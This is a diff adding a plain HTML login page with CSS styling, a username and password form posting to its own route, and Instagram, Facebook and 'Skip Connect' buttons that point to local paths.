@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Login</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #e9ecef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: white;
+      padding: 40px 50px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
+      width: 360px;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .login-container h2 {
+      margin-bottom: 25px;
+      font-weight: 600;
+      color: #343a40;
+    }
+    .login-container form {
+      display: flex;
+      flex-direction: column;
+    }
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      padding: 14px 18px;
+      margin-bottom: 20px;
+      border: 1px solid #ced4da;
+      border-radius: 8px;
+      font-size: 15px;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+    }
+    .login-container input[type="text"]:focus,
+    .login-container input[type="password"]:focus {
+      border-color: #495057;
+      outline: none;
+    }
+    .login-container button.login-btn {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 30px;
+      transition: background-color 0.3s ease;
+    }
+    .login-container button.login-btn:hover {
+      background-color: #0056b3;
+    }
+    .social-login {
+      display: flex;
+      justify-content: space-between;
+    }
+    .social-login button {
+      flex: 1;
+      margin: 0 5px;
+      padding: 12px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+      color: white;
+      transition: background-color 0.3s ease;
+    }
+    .social-login button:first-child {
+      margin-left: 0;
+    }
+    .social-login button:last-child {
+      margin-right: 0;
+    }
+    .social-login button.instagram {
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    }
+    .social-login button.instagram:hover {
+      background: linear-gradient(45deg, #e6683c, #dc2743, #cc2366, #bc1888, #f09433);
+    }
+    .social-login button.facebook {
+      background-color: #3b5998;
+    }
+    .social-login button.facebook:hover {
+      background-color: #2d4373;
+    }
+    .social-login button.skip {
+      background-color: #6c757d;
+    }
+    .social-login button.skip:hover {
+      background-color: #5a6268;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Login</h2>
+    <form method="POST">
+      <input type="text" name="username" placeholder="Email or Phone" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit" name="action" value="login" class="login-btn">Log In</button>
+    </form>
+    <p style="font-size: 14px; color: #6c757d;">Or connect with:</p>
+    <br>
+    <div class="social-login">
+      <button onclick="window.location.href='/instagram_connect'" class="instagram">Instagram</button>
+      <button onclick="window.location.href='/facebook_connect'" class="facebook">Facebook</button>
+      <button onclick="window.location.href='/skips_connect'" class="skip">Skip Connect</button>
+    </div>
+  </div>
+</body>
+</html>
